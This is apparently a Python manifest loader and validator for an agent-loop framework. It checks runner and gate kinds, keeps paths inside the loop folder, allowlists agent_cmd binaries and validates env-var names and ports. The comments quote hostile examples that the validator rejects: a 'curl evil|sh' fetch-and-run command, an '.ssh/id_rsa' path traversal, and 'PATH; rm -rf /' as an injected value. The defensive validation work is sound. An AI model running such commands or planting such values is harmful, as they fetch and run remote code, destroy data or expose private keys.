"""
Manifest loader + validator.

Loads a `loop.yaml` and its referenced `bounds.yaml` from a loop folder,
validates both against the frozen schemas, and returns a single frozen
`LoopManifest` carrying built `Spec`/`Bounds` objects as fields. This is
the ONE shape `composition.py` consumes.

Enforces two hard validation rules:
  1. runner.default MUST be "stub", "shell", or "python_callable" (keyless).
  2. gate.kind in {agentassert, agentassay, skillfortify, attestar} is
     FORBIDDEN as a default (only allowed with --gate-override, at the CLI
     layer — not here).

Plus two security bounds:
  - max_iterations ceiling: hard cap of 1000, no manifest override.
  - path containment: spec/bounds/memory paths must resolve inside
    loop_dir — rejects path traversal (e.g. `spec: ../../../../.ssh/id_rsa`).

No I/O escape hatch: PyYAML `safe_load()` only (never `yaml.load()` without
a Loader — that permits arbitrary Python object instantiation, a known CVE
class). No network, no subprocess.
"""

from __future__ import annotations

import os
import re
import shlex
import sys
from collections.abc import Mapping
from dataclasses import dataclass, field
from pathlib import Path, PureWindowsPath
from types import MappingProxyType
from typing import Optional


from bounded_loops.application._manifest_validate import (
    _load_yaml_mapping,
    _reject_unknown_keys,
    _resolve_contained,
)
from bounded_loops.application.manifest_bounds import (
    _load_bounds,
)
from bounded_loops.domain.errors import ManifestError
from bounded_loops.domain.models import Bounds, Rung, Spec

# Shape check for runner.env_passthrough entries. See
# _load_env_passthrough's docstring for exactly what this regex does and
# does NOT guarantee.
_ENV_VAR_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")

# Port names: lowercase, alphanumeric + hyphen/underscore, max 63 chars.
_PORT_NAME_RE = re.compile(r"^[a-z][a-z0-9_-]{0,62}$")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

KEYLESS_RUNNERS = {"stub", "shell", "python_callable"}   # python_callable needs
                                                           # no API key — same
                                                           # trust tier as shell.

QUALIXAR_GATE_KINDS = {"agentassert", "agentassay", "skillfortify", "attestar"}

VALID_GATE_KINDS = {
    "command", "pytest", "composite", "axe", "osv", "checkov",
    "gitleaks", "semgrep", "trivy", "promptfoo", "great_expectations", "jsonschema",
} | QUALIXAR_GATE_KINDS

VALID_RUNGS = {"L1", "L2", "L3"}

VALID_PATTERNS = {
    "augmented-llm", "prompt-chaining", "routing",
    "parallelization", "orchestrator-workers",
    "evaluator-optimizer", "agents",
}

# MAX_ITERATIONS_CEILING and _BOUNDS_KEYS now live in manifest_bounds.py and are re-exported by the
# import above, so importers of this module keep working and there is one definition of each.

# M-1 fix: allowlist of binary basenames permitted as the first token of
# runner.agent_cmd. Mirrors the graph engine's CLI_PROFILES registry.
#
# Rationale: bounded-loops explicitly invites community loop PRs, which means
# loop.yaml arrives from untrusted authors. The manifest's `agent_cmd` field
# is loop-author-controlled shell that executes BEFORE the gate on every lap.
# Without a constraint, a malicious author submits `agent_cmd: "curl evil|sh"`
# and every user who runs that loop executes arbitrary code without any
# binary-level human review.
#
# The allowlist ensures the first token must be a binary that the project has
# deliberately vouched for. To add a new binary, open a PR to extend this
# set — the code review of that change IS the human gate before it ships.
# All currently shipped loops use runner.default: stub or python_callable and
# do not set agent_cmd, so no existing loop is affected by this constraint.
AGENT_CMD_ALLOWLIST: frozenset[str] = frozenset({
    "agy",       # Antigravity CLI
    "claude",    # Anthropic Claude Code CLI
    "codex",     # OpenAI Codex CLI
    "grok",      # xAI Grok CLI
    "muse",      # Muse CLI
    "python",    # Python interpreter
    "python3",   # Python 3 interpreter
    "true",      # POSIX no-op (exits 0, ignores all args — zero attack surface;
                 # admitted so trivial no-op test fixtures need no grant)
    "uv",        # uv run (Python project runner)
})

# Enterprise extension: operators that run their own internal agent CLIs can
# add basenames here via the environment rather than a code PR. Each entry added
# this way should carry a review note inside the adopting organisation's deployment
# configuration — the env var is the operator-level gate.
# Format: BOUNDED_LOOPS_EXTRA_AGENT_CMDS=acn-run,corp-agent
# Same shape as BOUNDED_LOOPS_CLI_ENV_GRANT (explicit opt-in, safe default of ∅).
_EXTRA_AGENT_CMDS_ENV = "BOUNDED_LOOPS_EXTRA_AGENT_CMDS"

_LOOP_KEYS = frozenset({
    "name", "description", "pattern", "role", "rung", "runner", "gate",
    "spec", "bounds", "memory", "forbid", "inputs", "outputs",
})
_RUNNER_KEYS = frozenset({
    "default", "cassette", "agent_cmd", "module_path", "function_name",
    "env_passthrough", "image", "approve_policy",
})
_GATE_KEYS = frozenset({
    "kind", "run", "mode", "gates", "schema", "config", "severity", "checkpoint",
})


# ---------------------------------------------------------------------------
# Port declarations — carried on LoopManifest, validated at load time
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class LoopInputPort:
    """One declared input port on a loop package.

    ``path`` is the workspace-relative destination the overlay mechanism will
    write the upstream artifact to — validated at manifest load time with the
    same traversal-free rules as declared graph outputs.  ``required=True``
    (default) means the loop subprocess exits non-zero if the artifact is absent.
    """
    name: str
    path: str
    required: bool = True
    media_type: str = "application/octet-stream"


@dataclass(frozen=True)
class LoopOutputPort:
    """One declared output port on a loop package.

    ``path`` is the workspace-relative source file the loop must produce.
    After the loop engine runs, the entry point copies it to
    ``cwd/outputs/<name>`` so the sandboxed worker can promote it as a
    graph artifact alongside ``loop-outcome.json``.
    """
    name: str
    path: str
    media_type: str = "application/octet-stream"


# ---------------------------------------------------------------------------
# LoopManifest — the ONE shape
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class LoopManifest:
    """
    The ONE LoopManifest shape. `composition.wire()` consumes
    exactly these field names — this is the single source of truth.
    Internal carrier only — not exported to the domain layer.
    """
    name:        str
    spec:        Spec
    bounds:      Bounds
    runner_kind: str
    gate_kind:   str
    gate_config: dict
    rung:        Rung
    cassette:    Optional[str]
    raw:         dict
    loop_dir:    Path
    memory_path: Path
    env_passthrough: tuple[str, ...] = ()   # fields with defaults follow
    # Port declarations: absent = fixture-mode (no overlay, no extra outputs).
    #
    # ``default_factory``, not a shared class-level default, and the reason is a hard 3.11 break.
    # A bare ``MappingProxyType({})`` default reads as safe — it IS immutable — but dataclasses on
    # Python 3.11 reject any default whose class is unhashable, and ``mappingproxy`` only became
    # hashable in 3.12. So the class body raised at IMPORT time on 3.11:
    # ``ValueError: mutable default <class 'mappingproxy'> for field inputs is not allowed``.
    # The package declares ``requires-python = ">=3.11"``, so that is every 3.11 user losing
    # ``import bounded_loops`` entirely. It passed locally because this machine runs 3.12+; CI's
    # 3.11 clean-room job is what caught it, on the release commit.
    inputs: Mapping[str, LoopInputPort] = field(
        default_factory=lambda: MappingProxyType({}),
    )
    outputs: Mapping[str, LoopOutputPort] = field(
        default_factory=lambda: MappingProxyType({}),
    )


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def load(loop_dir: Path) -> LoopManifest:
    """
    Primary entry point. Raises ManifestError on any validation failure.
    Returns the single LoopManifest carrying built Spec/Bounds objects.
    Callers (cli.py, composition.py) access `manifest.spec` /
    `manifest.bounds` directly.
    """
    loop_dir = loop_dir.resolve()

    # ── Step 1: Read loop.yaml ──
    yaml_path = loop_dir / "loop.yaml"
    if not yaml_path.exists():
        raise ManifestError(f"loop.yaml not found in {loop_dir}")
    raw = _load_yaml_mapping(yaml_path, "loop.yaml")

    _reject_unknown_keys(raw, _LOOP_KEYS, "loop")

    # ── Step 2: Validate required top-level keys ──
    _require(raw, "name", yaml_path)
    _require(raw, "description", yaml_path)
    _require(raw, "pattern", yaml_path)
    _require(raw, "role", yaml_path)
    _require(raw, "rung", yaml_path)
    _require(raw, "runner", yaml_path)
    _require(raw, "gate", yaml_path)

    # ── Step 3: Validate enum values ──
    _require_nonempty_string(raw, "name", "loop.yaml")
    _require_nonempty_string(raw, "description", "loop.yaml")
    if not isinstance(raw["rung"], str) or raw["rung"] not in VALID_RUNGS:
        raise ManifestError(f"rung must be L1|L2|L3, got {raw['rung']!r}")
    if not isinstance(raw["pattern"], str) or raw["pattern"] not in VALID_PATTERNS:
        raise ManifestError(
            f"loop.yaml: pattern {raw['pattern']!r} is not one of Anthropic's seven "
            f"agentic patterns. Valid values: {sorted(VALID_PATTERNS)}. "
            f"See https://www.anthropic.com/engineering/building-effective-agents "
            f"for definitions."
        )
    _validate_string_list(raw["role"], "role")
    if "forbid" in raw:
        _validate_string_list(raw["forbid"], "forbid", allow_empty=True)

    # ── Step 4: Validate runner ──
    runner_block = raw["runner"]
    if not isinstance(runner_block, dict) or "default" not in runner_block:
        raise ManifestError("runner.default is required")
    _reject_unknown_keys(runner_block, _RUNNER_KEYS, "runner")
    runner_kind = runner_block["default"]
    if not isinstance(runner_kind, str) or runner_kind not in KEYLESS_RUNNERS:
        raise ManifestError(
            f"runner.default must be stub|shell|python_callable (keyless) for a "
            f"default manifest; got {runner_kind!r}. Use --runner on the CLI to "
            f"override at runtime."
        )
    cassette = runner_block.get("cassette")  # optional override; None → adapter default
    # hardening: unlike spec/bounds/memory, runner.cassette was
    # taken verbatim — an absolute or `../` path (Path("/loop") / "/tmp/x" ==
    # "/tmp/x") let a loop load an EXTERNAL cassette that also escaped the
    # trust-store content hash. Contain it inside loop_dir here, at load time.
    if cassette is not None:
        if not isinstance(cassette, str) or not cassette:
            raise ManifestError("runner.cassette must be a non-empty string when given")
        _resolve_contained(loop_dir, cassette, "runner.cassette")  # raises on escape

    # M-1 fix: validate agent_cmd against AGENT_CMD_ALLOWLIST. This runs
    # for ALL runner kinds so a stub/python_callable manifest cannot sneak
    # in an agent_cmd field pointing at an unlisted binary.
    agent_cmd = runner_block.get("agent_cmd")
    if agent_cmd is not None:
        _validate_agent_cmd(agent_cmd)

    # python_callable requires module_path (required, non-empty string) and
    # accepts an optional function_name (default "run_turn", non-empty
    # string if given). Validated HERE, at manifest-load time, so a missing/
    # bad module_path surfaces as a clean ManifestError rather than an
    # opaque TypeError from importlib.import_module(None) inside the
    # isolated subprocess.
    if runner_kind == "python_callable":
        module_path = runner_block.get("module_path")
        if not isinstance(module_path, str) or not module_path:
            raise ManifestError(
                "runner.module_path is required for runner.default: python_callable"
            )
        function_name = runner_block.get("function_name", "run_turn")
        if not isinstance(function_name, str) or not function_name:
            raise ManifestError(
                "runner.function_name must be a non-empty string when given "
                "for runner.default: python_callable"
            )

    # ── Step 5: Validate gate ──
    gate_block = raw["gate"]
    if not isinstance(gate_block, dict) or "kind" not in gate_block:
        raise ManifestError(
            "loop.yaml: gate.kind is required. "
            "Add a gate block, for example:\n"
            "  gate:\n"
            "    kind: command\n"
            "    run: \"python3 seed/check.py\""
        )
    _validate_gate_config(gate_block, "gate")
    gate_kind = gate_block["kind"]
    if not isinstance(gate_kind, str) or gate_kind not in VALID_GATE_KINDS:
        user_visible_kinds = sorted(VALID_GATE_KINDS - QUALIXAR_GATE_KINDS)
        raise ManifestError(
            f"loop.yaml: gate.kind {gate_kind!r} is not a recognized kind. "
            f"Valid kinds: {user_visible_kinds}. "
            f"Check for a typo. For Qualixar product gates (agentassert, agentassay, "
            f"skillfortify, attestar), use --gate-override on the CLI instead of "
            f"setting them in loop.yaml."
        )
    if gate_kind in QUALIXAR_GATE_KINDS:
        raise ManifestError(
            f"gate.kind {gate_kind!r} is a Qualixar product gate and is FORBIDDEN "
            f"as a manifest default. Use --gate-override on the CLI instead."
        )
    gate_run = gate_block.get("run")  # str | None (required for kind=command)
    if gate_kind == "command" and gate_run is None:
        raise ManifestError(
            "loop.yaml: gate.run is required when gate.kind=command. "
            "Add gate.run: \"<your-check-command>\" — for example: "
            "gate.run: \"python3 seed/check.py\" or gate.run: \"pytest -q\"."
        )
    if gate_kind == "composite":
        _validate_composite_gate(gate_block)
    # gate_config merges "run" + every other gate.* key into ONE dict —
    # this is what composition.py passes as **kwargs to non-command gates.
    gate_config = {k: v for k, v in gate_block.items() if k != "kind"}

    # ── Step 6: Resolve + CONTAIN paths ──
    spec_rel = _path_field(raw, "spec", "PROMPT.md")
    bounds_rel = _path_field(raw, "bounds", "bounds.yaml")
    memory_rel = _path_field(raw, "memory", "STATE.md")
    spec_path = _resolve_contained(loop_dir, spec_rel, "spec")
    bounds_path = _resolve_contained(loop_dir, bounds_rel, "bounds")
    memory_path = _resolve_contained(loop_dir, memory_rel, "memory")

    # ── Step 7: Load PROMPT.md → build Spec ──
    if not spec_path.exists():
        raise ManifestError(f"spec file {spec_path} not found")
    spec_text = spec_path.read_text(encoding="utf-8").strip()
    spec = Spec(
        name=raw["name"],
        goal=raw["description"],
        steps=(spec_text,),  # single step = the full prompt; gate proves stop
        stop_condition=f"gate {gate_kind} passes",
        forbid=tuple(raw.get("forbid", [])),
    )

    # ── Step 8: Load + validate bounds.yaml → build Bounds ──
    bounds = _load_bounds(bounds_path, loop_dir)

    # ── Step 9: parse + validate env_passthrough ──
    env_passthrough = _load_env_passthrough(runner_block)

    # ── Step 10: parse + validate port declarations (backward-compatible) ──
    inputs = _parse_input_ports(raw.get("inputs"))
    outputs = _parse_output_ports(raw.get("outputs"))

    return LoopManifest(
        name=raw["name"],
        spec=spec,
        bounds=bounds,
        runner_kind=runner_kind,
        gate_kind=gate_kind,
        gate_config=gate_config,
        rung=Rung(raw["rung"]),
        cassette=cassette,
        raw=raw,
        loop_dir=loop_dir,
        memory_path=memory_path,
        env_passthrough=env_passthrough,
        inputs=inputs,
        outputs=outputs,
    )


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _require_nonempty_string(values: Mapping[object, object], field_name: str, section: str) -> str:
    value = values[field_name]
    if not isinstance(value, str) or not value.strip():
        raise ManifestError(f"{section}: {field_name} must be a non-empty string")
    return value


def _validate_string_list(value: object, field_name: str, *, allow_empty: bool = False) -> None:
    if not isinstance(value, list) or (not allow_empty and not value):
        qualifier = "possibly empty " if allow_empty else "non-empty "
        raise ManifestError(f"{field_name} must be a {qualifier}list of non-empty strings")
    if any(not isinstance(entry, str) or not entry.strip() for entry in value):
        raise ManifestError(f"{field_name} must be a list of non-empty strings")


def _path_field(values: Mapping[object, object], field_name: str, default: str) -> str:
    value = values.get(field_name, default)
    if not isinstance(value, str) or not value.strip():
        raise ManifestError(f"loop.yaml: {field_name} must be a non-empty string")
    return value


def _validate_gate_config(gate_block: dict, section: str) -> None:
    _reject_unknown_keys(gate_block, _GATE_KEYS, section)
    kind = gate_block.get("kind")
    if not isinstance(kind, str) or not kind:
        raise ManifestError(f"{section}.kind must be a non-empty string")
    for field_name in ("run", "schema", "config", "severity", "checkpoint"):
        if field_name in gate_block:
            value = gate_block[field_name]
            if not isinstance(value, str) or not value.strip():
                raise ManifestError(f"{section}.{field_name} must be a non-empty string")
    if "mode" in gate_block and (not isinstance(gate_block["mode"], str) or not gate_block["mode"].strip()):
        raise ManifestError(f"{section}.mode must be a non-empty string")
    if kind == "composite":
        gates = gate_block.get("gates")
        if not isinstance(gates, list) or not gates:
            raise ManifestError(f"{section}.gates must be a non-empty gates list")
        for index, child in enumerate(gates):
            if not isinstance(child, dict):
                raise ManifestError(f"{section}.gates[{index}] must be an object")
            _validate_gate_config(child, f"{section}.gates[{index}]")


def _require(d: dict, key: str, path: Path) -> None:
    if key not in d:
        raise ManifestError(f"loop.yaml missing required key {key!r} ({path})")


def _validate_composite_gate(gate_block: dict) -> None:
    mode = gate_block.get("mode", "all")
    if mode != "all":
        raise ManifestError("gate.kind=composite supports only mode: all in v1")
    gates = gate_block.get("gates")
    if not isinstance(gates, list) or not gates:
        raise ManifestError("gate.kind=composite requires a non-empty gates list")
    for index, child in enumerate(gates):
        if not isinstance(child, dict):
            raise ManifestError(f"gate.gates[{index}] must be an object")
        child_kind = child.get("kind")
        if child_kind == "composite":
            raise ManifestError("nested composite gates are not supported in v1")
        if child_kind not in VALID_GATE_KINDS:
            raise ManifestError(f"gate.gates[{index}].kind {child_kind!r} is not recognized")
        if child_kind in QUALIXAR_GATE_KINDS:
            raise ManifestError(
                f"gate.gates[{index}].kind {child_kind!r} is a Qualixar product gate "
                "and is FORBIDDEN as a manifest default."
            )
        if child_kind == "command" and child.get("run") is None:
            raise ManifestError(f"gate.gates[{index}].run is required when kind=command")


def _validate_agent_cmd(agent_cmd: object) -> None:
    """M-1 fix: constrain runner.agent_cmd to AGENT_CMD_ALLOWLIST binaries.

    Checks the basename of the first token (the binary) against the effective
    allowlist (AGENT_CMD_ALLOWLIST union any operator-supplied extensions from
    BOUNDED_LOOPS_EXTRA_AGENT_CMDS). Absolute paths are permitted as long as
    their basename is in the effective set (e.g. /usr/local/bin/claude → 'claude').

    Shell metacharacters in the full string are not a concern here because
    ShellRunner already uses shlex.split + shell=False, preventing shell
    reinterpretation; this check is specifically about which binary is launched.
    """
    if not isinstance(agent_cmd, str) or not agent_cmd.strip():
        raise ManifestError("runner.agent_cmd must be a non-empty string when given")
    try:
        tokens = shlex.split(agent_cmd)
    except ValueError as exc:
        raise ManifestError(
            f"runner.agent_cmd {agent_cmd!r} has invalid shell quoting: {exc}"
        ) from exc
    if not tokens:
        raise ManifestError("runner.agent_cmd is empty after parsing")
    binary_basename = Path(tokens[0]).name
    extra_raw = os.environ.get(_EXTRA_AGENT_CMDS_ENV, "")
    extra: frozenset[str] = frozenset(
        name.strip() for name in extra_raw.split(",") if name.strip()
    )
    effective = AGENT_CMD_ALLOWLIST | extra
    if binary_basename in extra and binary_basename not in AGENT_CMD_ALLOWLIST:
        # SEC-07. The operator extension is a legitimate control — it is how an
        # enterprise runs its own agent binary without forking the package. What was
        # missing is that using it left no trace: the run executed a binary outside the
        # reviewed allowlist and nothing anywhere said so, which is the same shape as a
        # bound that is declared and not enforced. Named on stderr at the moment it is
        # exercised, so the widening appears in the operator's log next to the run that
        # used it.
        print(
            f"[bounded-loops] agent_cmd {binary_basename!r} is permitted only by the "
            f"operator extension {_EXTRA_AGENT_CMDS_ENV}; it is not in the reviewed "
            f"allowlist shipped with this package.",
            file=sys.stderr,
        )
    if binary_basename not in effective:
        raise ManifestError(
            f"runner.agent_cmd first token {binary_basename!r} is not in the "
            f"agent_cmd allowlist ({sorted(AGENT_CMD_ALLOWLIST)}). "
            f"To allow a new binary: open a PR to extend AGENT_CMD_ALLOWLIST "
            f"in bounded_loops/application/manifest.py (the code review is "
            f"the human gate), OR set "
            f"{_EXTRA_AGENT_CMDS_ENV}={binary_basename} in your deployment "
            f"environment for an enterprise-local extension (document the review "
            f"decision in your deployment configuration)."
        )


def _load_env_passthrough(runner_block: dict) -> tuple[str, ...]:
    """
    Validates runner.env_passthrough (optional). Each entry must be a
    non-empty string matching a conservative env-var-name shape
    (uppercase letters, digits, underscore, must not start with a digit).

    correction: this regex is
    a SHAPE check only. It is NOT an authorization control and does NOT
    decide which secrets may be passed through — it only rejects a string
    that isn't a syntactically legal env-var NAME (so a malformed value
    like "PATH; rm -rf /" is rejected). A syntactically valid name can
    still be a live secret: "AWS_SECRET_ACCESS_KEY" and "GITHUB_TOKEN"
    both pass this regex cleanly. Do not read "rejected before it reaches
    a subprocess env dict" as a security guarantee about WHICH vars are
    safe to pass — it only guarantees the STRING is name-shaped. The real
    authorization boundary is an operator-level allowlist enforced by the
    consuming wiring at wire()-time
    — a loop.yaml naming a syntactically valid but non-operator-allowlisted
    var MUST be refused there, not here. This function's job ends at "is
    this a legal name," and that boundary is deliberate, not an oversight:
    manifest.py has no concept of "the operator's environment" to check
    against, so the authorization decision cannot live here.
    """
    raw_list = runner_block.get("env_passthrough")
    if raw_list is None:
        return ()
    if not isinstance(raw_list, list):
        raise ManifestError(
            "loop.yaml: runner.env_passthrough must be a list of strings, "
            f"got {type(raw_list).__name__}"
        )
    validated = []
    for entry in raw_list:
        if not isinstance(entry, str) or not _ENV_VAR_NAME_RE.fullmatch(entry):
            raise ManifestError(
                f"loop.yaml: runner.env_passthrough entry {entry!r} is not "
                "a valid environment variable name (uppercase letters, "
                "digits, underscore; must not start with a digit)"
            )
        validated.append(entry)
    return tuple(validated)


# ---------------------------------------------------------------------------
# Port declaration helpers
# ---------------------------------------------------------------------------

_PORT_KEYS_INPUT = frozenset({"path", "required", "media_type"})
_PORT_KEYS_OUTPUT = frozenset({"path", "media_type"})


def _validate_port_name(name: object, section: str) -> str:
    """Reject any port name that is not [a-z][a-z0-9_-]{0,62}."""
    if not isinstance(name, str) or not _PORT_NAME_RE.fullmatch(name):
        raise ManifestError(
            f"loop.yaml: {section} port name {name!r} must match "
            r"[a-z][a-z0-9_-]{0,62}"
        )
    return name


def _validate_port_path(path: object, field_name: str) -> str:
    """Reject paths that escape the workspace.

    Mirrors the rules in ``workspace_promotion._validate_relative_output``
    without importing from the graph layer (which would create a cross-tier
    dependency at manifest load time).
    """
    if not isinstance(path, str) or not path:
        raise ManifestError(
            f"loop.yaml: {field_name}.path must be a non-empty string"
        )
    if "\\" in path or ":" in path:
        raise ManifestError(
            f"loop.yaml: {field_name}.path must be POSIX-relative and portable"
        )
    if any(segment in {"", ".", ".."} for segment in path.split("/")):
        raise ManifestError(
            f"loop.yaml: {field_name}.path must be relative, canonical, "
            "and traversal-free (no '..' or empty segments)"
        )
    wp = PureWindowsPath(path)
    if wp.is_absolute() or wp.drive or wp.anchor:
        raise ManifestError(
            f"loop.yaml: {field_name}.path must not be Windows-rooted"
        )
    return path


def _parse_input_ports(raw_inputs: object) -> MappingProxyType:
    """Parse the optional ``inputs:`` block from loop.yaml."""
    if raw_inputs is None:
        return MappingProxyType({})
    if not isinstance(raw_inputs, dict):
        raise ManifestError("loop.yaml: inputs must be a mapping")
    result: dict[str, LoopInputPort] = {}
    for name, spec in raw_inputs.items():
        _validate_port_name(name, "inputs")
        if not isinstance(spec, dict):
            raise ManifestError(f"loop.yaml: inputs.{name} must be a mapping")
        unknown = sorted(k for k in spec if k not in _PORT_KEYS_INPUT)
        if unknown:
            raise ManifestError(
                f"loop.yaml: inputs.{name}: unknown key {unknown[0]!r}. "
                f"Valid keys: {sorted(_PORT_KEYS_INPUT)}"
            )
        if "path" not in spec:
            raise ManifestError(f"loop.yaml: inputs.{name}.path is required")
        path = _validate_port_path(spec["path"], f"inputs.{name}")
        required = spec.get("required", True)
        if not isinstance(required, bool):
            raise ManifestError(
                f"loop.yaml: inputs.{name}.required must be a boolean"
            )
        media_type = spec.get("media_type", "application/octet-stream")
        if not isinstance(media_type, str) or not media_type:
            raise ManifestError(
                f"loop.yaml: inputs.{name}.media_type must be a non-empty string"
            )
        result[name] = LoopInputPort(
            name=name, path=path, required=required, media_type=media_type,
        )
    return MappingProxyType(result)


def _parse_output_ports(raw_outputs: object) -> MappingProxyType:
    """Parse the optional ``outputs:`` block from loop.yaml."""
    if raw_outputs is None:
        return MappingProxyType({})
    if not isinstance(raw_outputs, dict):
        raise ManifestError("loop.yaml: outputs must be a mapping")
    result: dict[str, LoopOutputPort] = {}
    for name, spec in raw_outputs.items():
        _validate_port_name(name, "outputs")
        if not isinstance(spec, dict):
            raise ManifestError(f"loop.yaml: outputs.{name} must be a mapping")
        unknown = sorted(k for k in spec if k not in _PORT_KEYS_OUTPUT)
        if unknown:
            raise ManifestError(
                f"loop.yaml: outputs.{name}: unknown key {unknown[0]!r}. "
                f"Valid keys: {sorted(_PORT_KEYS_OUTPUT)}"
            )
        if "path" not in spec:
            raise ManifestError(f"loop.yaml: outputs.{name}.path is required")
        path = _validate_port_path(spec["path"], f"outputs.{name}")
        media_type = spec.get("media_type", "application/octet-stream")
        if not isinstance(media_type, str) or not media_type:
            raise ManifestError(
                f"loop.yaml: outputs.{name}.media_type must be a non-empty string"
            )
        result[name] = LoopOutputPort(name=name, path=path, media_type=media_type)
    return MappingProxyType(result)
